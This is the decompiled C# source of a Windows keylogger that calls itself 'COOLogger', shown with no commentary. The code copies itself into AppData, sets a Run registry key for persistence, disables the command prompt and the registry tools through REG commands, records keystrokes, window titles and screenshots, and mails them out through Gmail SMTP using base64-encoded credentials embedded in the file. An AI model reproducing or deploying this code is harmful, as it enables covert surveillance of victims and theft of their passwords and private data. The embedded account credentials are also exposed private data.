using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class vnMbUEmoJlqEOjw
{
	private static string kWxUTuctfjKjuoH = "ZmF6ZGFuYUBnbWFpbC5jb20=";

	private static string FbwVOKVmBWKUrmQ = "YnJvbmNvczE=";

	private static string RxSXfVBKLJOlryd = "smtp.gmail.com";

	private static int qpGJMEcrkVDFZCH = 587;

	private static string cCRKtbeybftEZmZ;

	private static string MmJIkSjVZyZkewt;

	private static string QmLDyLcqMzJgbFH;

	private static string nINVLqzzyDahoTf;

	private static string fuyCtShaKruPrvK;

	private static string PFkttsxibiNaZps;

	private static int BMGYHdNYealDSZb = 1800000;

	private static string hEQeMdPTsheYqnL = null;

	private static object URzNmmOWjLfKiza = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string kIDgiPVowlRNNLQ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage CIPgHGWMPHfJnlT = new MailMessage();

	private static SmtpClient ZEnjYsiZnxggTGh = new SmtpClient();

	[AccessedThroughProperty("sdZNiYPdnWWJvWs")]
	private static EQeMdPTsheYqnLg _sdZNiYPdnWWJvWs;

	private static object wILavwHQLoEXrKF = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox vZEnjYsiZnxggTG = new RichTextBox();

	private static EQeMdPTsheYqnLg sdZNiYPdnWWJvWs
	{
		get
		{
			return _sdZNiYPdnWWJvWs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_sdZNiYPdnWWJvWs != null)
			{
				EQeMdPTsheYqnLg.KeyDown -= svnMbUEmoJlqEOj;
			}
			_sdZNiYPdnWWJvWs = value;
			if (_sdZNiYPdnWWJvWs != null)
			{
				EQeMdPTsheYqnLg.KeyDown += svnMbUEmoJlqEOj;
			}
		}
	} = new EQeMdPTsheYqnLg();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		PFkttsxibiNaZps = Conversions.ToString(true);
		QmLDyLcqMzJgbFH = Conversions.ToString(true);
		nINVLqzzyDahoTf = Conversions.ToString(true);
		fuyCtShaKruPrvK = Conversions.ToString(false);
		MmJIkSjVZyZkewt = Conversions.ToString(true);
		cCRKtbeybftEZmZ = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, URzNmmOWjLfKiza, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(URzNmmOWjLfKiza, (object)"\\xFVwvMCEvVxcaJw.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(kIDgiPVowlRNNLQ + "\\xFVwvMCEvVxcaJw.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(URzNmmOWjLfKiza, (object)"\\"), wILavwHQLoEXrKF))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(URzNmmOWjLfKiza, (object)"\\"), wILavwHQLoEXrKF)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(URzNmmOWjLfKiza, (object)"\\"), wILavwHQLoEXrKF)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(URzNmmOWjLfKiza, (object)"\\"), wILavwHQLoEXrKF)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(URzNmmOWjLfKiza, (object)"\\"), wILavwHQLoEXrKF) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(cCRKtbeybftEZmZ))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(wILavwHQLoEXrKF)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(wILavwHQLoEXrKF), Operators.ConcatenateObject(Operators.ConcatenateObject(URzNmmOWjLfKiza, (object)"\\"), wILavwHQLoEXrKF));
			}
		}
		if (Conversions.ToBoolean(MmJIkSjVZyZkewt))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(URzNmmOWjLfKiza, (object)"\\xFVwvMCEvVxcaJw.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(QmLDyLcqMzJgbFH))
		{
			Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(nINVLqzzyDahoTf))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(fuyCtShaKruPrvK))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(1800000);
		val.add_Tick((EventHandler)GUBTFJiWUOgdzWu_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)BwILavwHQLoEXrK_Ticked);
		val2.Start();
		sdZNiYPdnWWJvWs.FLHTWkGIRbWyPhC();
		Application.Run();
	}

	private static string KfgqOuYnUatCrXS()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string wkWxUTuctfjKjuo(string dqpGJMEcrkVDFZC)
	{
		byte[] bytes = Convert.FromBase64String(dqpGJMEcrkVDFZC);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void GUBTFJiWUOgdzWu_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(PFkttsxibiNaZps))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = CVPFkttsxibiNaZ(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(URzNmmOWjLfKiza, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(URzNmmOWjLfKiza, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(wkWxUTuctfjKjuo(kWxUTuctfjKjuoH));
				mailMessage.To.Add(wkWxUTuctfjKjuo(kWxUTuctfjKjuoH));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = vZEnjYsiZnxggTG.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(wkWxUTuctfjKjuo(kWxUTuctfjKjuoH), wkWxUTuctfjKjuo(FbwVOKVmBWKUrmQ));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				vZEnjYsiZnxggTG.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage cIPgHGWMPHfJnlT = CIPgHGWMPHfJnlT;
		cIPgHGWMPHfJnlT.From = new MailAddress(wkWxUTuctfjKjuo(kWxUTuctfjKjuoH));
		cIPgHGWMPHfJnlT.To.Add(wkWxUTuctfjKjuo(kWxUTuctfjKjuoH));
		cIPgHGWMPHfJnlT.Subject = "COOLogger Logs from - " + Environment.UserName;
		cIPgHGWMPHfJnlT.Body = vZEnjYsiZnxggTG.get_Text();
		cIPgHGWMPHfJnlT = null;
		SmtpClient zEnjYsiZnxggTGh = ZEnjYsiZnxggTGh;
		zEnjYsiZnxggTGh.Host = "smtp.gmail.com";
		zEnjYsiZnxggTGh.Port = 587;
		zEnjYsiZnxggTGh.EnableSsl = true;
		zEnjYsiZnxggTGh.Credentials = new NetworkCredential(wkWxUTuctfjKjuo(kWxUTuctfjKjuoH), wkWxUTuctfjKjuo(FbwVOKVmBWKUrmQ));
		zEnjYsiZnxggTGh.Send(CIPgHGWMPHfJnlT);
		zEnjYsiZnxggTGh = null;
		vZEnjYsiZnxggTG.set_Text("");
	}

	public static void svnMbUEmoJlqEOj(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox val = vZEnjYsiZnxggTG;
		val.set_Text(val.get_Text() + sdZNiYPdnWWJvWs.VPFkttsxibiNaZp(e));
	}

	public static void BwILavwHQLoEXrK_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(hEQeMdPTsheYqnL, KfgqOuYnUatCrXS(), false) != 0)
		{
			hEQeMdPTsheYqnL = KfgqOuYnUatCrXS();
			if (Operators.CompareString(hEQeMdPTsheYqnL, "", false) != 0)
			{
				RichTextBox val = vZEnjYsiZnxggTG;
				val.set_Text(val.get_Text() + "\r\n\r\n~~~~~" + hEQeMdPTsheYqnL + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string CVPFkttsxibiNaZ(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
